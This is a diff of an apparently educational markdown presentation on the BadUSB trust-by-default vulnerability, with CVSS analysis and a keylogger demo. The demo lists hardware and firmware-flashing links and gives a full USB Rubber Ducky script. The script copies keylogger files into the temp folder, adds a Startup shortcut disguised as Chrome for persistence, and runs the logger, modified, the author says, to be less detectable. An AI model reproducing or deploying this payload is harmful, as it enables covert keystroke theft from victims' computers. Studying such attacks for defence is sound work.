@@ -11,7 +11,7 @@ The reason for such a high impact score is the voulnerability impacts confidenti
 The exploitability subscore was lower at only 3.4/10 and this is mainly due to the fact that the access vector is local meaning you need physical access to the device (to plug in the usb). The access complexity was medium and i would attribute this to the fact that you do need to know some stuff about your target system first before deploying the attack. Things you would need to know would be the operating system definitly since different operating systems have different keys for different things such as windows having the windows key. Also different operating systems require different sequences of keystrokes to access different areas of the computer such as windows key + r opens the run dialog on windows systems but wouldnt do that on Linux of Mac OS X. Finally, the exploit requires no authentication to work and this is why it is so devistating. The trust by default characteristic employed by computers on HID devices is the voulnerability that this attack exploits making it require no authentication. However, i would like to note that the most devistating attacks (except USB Killer) do require the device to be unlocked although several still do not. So i would say that while the exploit, being that computers just trust the usb by default requires no authentication but, many of the attacks that can be built ontop of this voulnerability do require the device to be unlocked.
 
 ## BadUSB Windows Keylogger
-For the demo portion of this presentation i will be showing how this voulnerability can be used to deliver a simple but devistating keylogger to a fully up to date Windows 10 system. 
+For the demo portion of this presentation i will be showing how this voulnerability can be used to deliver a simple but devistating keylogger to a fully up to date Windows 10 system. Before i get into it i would just like to [CosmodiumCS](https://github.com/CosmodiumCS) he is the guy who actually wrote the keylogger code and his [youtube channel](https://www.youtube.com/cosmodiumcs) has a ton of cool stuff i would definitly reccomend checking it out. Also [here](https://www.youtube.com/watch?v=uHIZZYFeVJA) is his tutorial i followed for the windows keylogger. I however did modify his attack slightly to make it a bit less detectable (more on that later).
 
 ### Hardware
 For this attack i will be using a [USB rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) which i purchaced from the [Hak5 store](https://shop.hak5.org/) several years ago for about $50. I would highly reccomend checking them out as they have some really cool hacking hardware on their site. This attack could also be carried out by another BadUSB configuration that is much cheaper but this is just what i had on hand. [Here](https://medium.com/@EatonChips/building-a-usb-rubber-ducky-for-7-c851aae30a1d) is a really cool tutorial that shows you how to make a BadUSB out of a $7 Arduino usb microcontroller. I have not actually tried this yet so i cant say if it works but i plan to try it in the future. 
@@ -26,3 +26,31 @@ If your interested there are a bunch of different attacks for the usb rubber duc
 For this attack i had to flash the rubber ducky with the twin duck firmware. Which is basically just a configuration where the rubber ducky not only emulates a keyboard but also usb mass storage so it can contain some files that are needed as part of the paylaod. The other way to do this without flashing the firmware (which is dangerous and can cause you to brick the usb) would just be to run a webserver and have the emulated keyboard type in a command to download the files from that server. [Here](https://github.com/hak5darren/USB-Rubber-Ducky) is a link that they don't advertise on their website but has all the things you need to flash the firmware and encode your payloads. [Here](https://www.youtube.com/watch?v=BzYH-BPHLpE) is also a youtube tutorial on how to flash the usb with the twin duck firmware or any of the other [firmware](https://github.com/hak5darren/USB-Rubber-Ducky/tree/master/Firmware/Images) they have available.
 
 ### Ducky Script
+Ducky script is a very simple language that has been devloped specifically for the usb rubber ducky and is how you tell it what you want it to type. [Here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) you can find a cheat sheet on the ducky script syntax but ill give a quick overview of the most important parts before i show you the script for the windows keylogger attack. 
+- REM is the command you put infront of comments
+- DELAY is the command you use to pause the program, which is important while you wait for things to load since this usb types extreamly fast. Also the numbers after delay are in milliseconds so 1000ms = 1sec
+- GUI is the command that tells it to hold the windows key
+- STRING is the command that tells it to type whatever comes after the command
+- ENTER is the command to press the enter key
+
+Those are the only 5 commands we need to write our payload for the USB rubber ducky. 
+```
+REM STAGE1
+REM open runbox
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM STAGE 3
+REM move files to appropiate directories
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd $env:temp;cp .\ChromeIcon.ico $env:temp;$WScriptObj = New-Object -ComObject ("WScript.Shell");$shortcut = $WscriptObj.CreateShortcut("C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.lnk");$shortcut.TargetPath = "$env:temp\c.cmd";$Shortcut.IconLocation = "$env:temp\ChromeIcon.ico, 0";$shortcut.Save();cd $env:temp;echo "">"$env:UserName.log";
+ENTER
+DELAY 200
+
+REM STAGE 4 run keylogger
+STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\Chrome.lnk;exit
+ENTER
+```
